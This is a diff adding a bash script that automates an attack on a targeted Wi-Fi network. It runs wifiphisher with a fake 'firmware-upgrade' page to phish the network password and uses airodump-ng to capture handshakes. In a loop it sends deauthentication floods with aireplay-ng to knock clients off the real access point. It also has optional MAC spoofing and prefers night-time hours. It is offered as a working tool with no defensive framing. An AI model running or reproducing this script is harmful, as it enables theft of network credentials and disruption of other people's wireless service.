@@ -1,0 +1,133 @@
+#!/bin/bash
+echo "$(whoami)"
+[ "$UID" -eq 0 ] || exec sudo "$0" "$@"
+##sudo iw dev jam1 del ;
+##sleep 1
+##sudo iw dev wlp3s0b1mon1 del;
+##sleep 1
+##sudo airmon-ng stop mon0 ;
+##sleep 1
+##sudo airmon-ng stop wlp3s0b1 ;
+##sleep 1
+#read -p 'essid:' essid
+sudo ./1listallw
+macchanging="off"
+
+jammode=1
+if [[ $jammode -eq 1 ]]
+then
+jamx=2
+jaminterval=4
+elif [[ $jammode -eq 2 ]]
+then
+jamx=10
+jaminterval=20
+fi
+
+while true; do
+
+sudo killall xterm ;
+sudo killall python2 ;
+sudo iw dev mon0 del ;
+sudo iw dev wlp3s0b1mon2 del ;
+sudo iw dev wlp3s0b1mon3 del ;
+sudo iw dev wlp3s0b1mon4 del ;
+sudo iw dev wlp3s0b1mon5 del ;
+sudo iw dev wlp3s0b1mon6 del ;
+sudo airmon-ng stop wlp3s0b1 ;
+sleep 1
+sudo service network-manager restart ;
+#nohup nm-applet>/dev/null & ;
+sleep 5
+
+hournow=$(date +%H)
+if [ $hournow -gt 18 -o $hournow -lt 8 ]
+then
+echo "Perfect time"
+else
+echo "$hournow Not the perfect time, should we carry on?"
+read -t 3 -p "y/n? " cont
+if [ $cont == "n" ]
+then
+exit
+fi
+fi
+
+essid=$(cat targ | grep \#\# | awk '{print $12}')
+bssid=$(cat targ | grep \#\# | awk '{print $2}')
+channel=$(nmcli -f CHAN,BSSID,ACTIVE dev wifi list | grep "$bssid" | awk '{print $1}')
+
+a=0
+until [[ $channel ]]
+do
+sleep 5
+echo "checkchannelagain"
+channel=$(nmcli -f CHAN,BSSID,ACTIVE dev wifi list | grep "$bssid" | awk '{print $1}')
+
+if [[ $a -gt 4 ]]
+then
+#sudo ./1listallw &
+sleep 10
+essid=$(cat targ | grep \#1\# | awk '{print $12}')
+bssid=$(cat targ | grep \#1\# | awk '{print $2}')
+channel=$(nmcli -f CHAN,BSSID,ACTIVE dev wifi list | grep "$bssid" | awk '{print $1}')
+fi
+((a++))
+
+done
+
+
+
+
+echo "$essid"
+echo "$bssid"
+echo "$channel"
+echo "jammode=$jammode"
+
+#bssidmc=$bssid
+bssidmc="C0:25:E9:BD:3D:8B"
+if [[ $macchanging =~ (on) ]]
+then
+sudo ifconfig wlp3s0b1 down
+sleep 1
+sudo macchanger -m $bssidmc wlp3s0b1
+sleep 1
+sudo ifconfig wlp3s0b1 up
+fi
+
+if [ -z "$channel" ] 
+then
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e "$essid" -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e \"$essid\" -p firmware-upgrade" &
+else
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e "$essid" -ch $channel -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e \"$essid\" -ch "$channel" -p firmware-upgrade" &
+fi
+#-pK s3cretpassword
+sleep 15
+#while true ; do if [[ -n $(iwconfig | grep wlp3s0b1mon3) ]] ; then  echo "check again" ; break ; fi ; done
+while true ; do 
+if [[ -n $(iwconfig | grep wlp3s0b1mon3) ]] ; then
+sleep 1
+xterm -hold -e "sudo airodump-ng wlp3s0b1mon3 --bssid "$bssid" --channel "$channel" -w \"/home/user/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/wifiphisher/handshakes/$essid\" " &
+break
+fi
+echo "check again"
+sleep 2
+done
+
+
+sleep 5
+xterm -hold -e "i=0 ; while true ; do sudo aireplay-ng -q 15 -0 $jamx -a "$bssid" wlp3s0b1mon4 --ignore-negative-one ; sleep $jaminterval ; ((i++)) ; done" &
+sleep 180
+done
+
+##sudo killall xterm ;
+##gnome-terminal --tab -x bash -c "echo $essid | sudo /home/user/Documents/Docs/2getmacr2" &
+##sleep 10
+##gnome-terminal -e \"sudo airodump-ng wlp3s0b1mon3 --bssid "+ap_mac+" -w \"/home/user/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2copy/wifiphisher/handshakes/"+essid+"\"\" &
+##gnome-terminal -e 'sh -c "while true; do sudo aireplay-ng -q 15 -0 10 -a "'$bssid'" wlp3s0b1mon4 --ignore-negative-one; sleep 30; done"'
+##-e "'$essid'"
+##-p firmware-upgrade
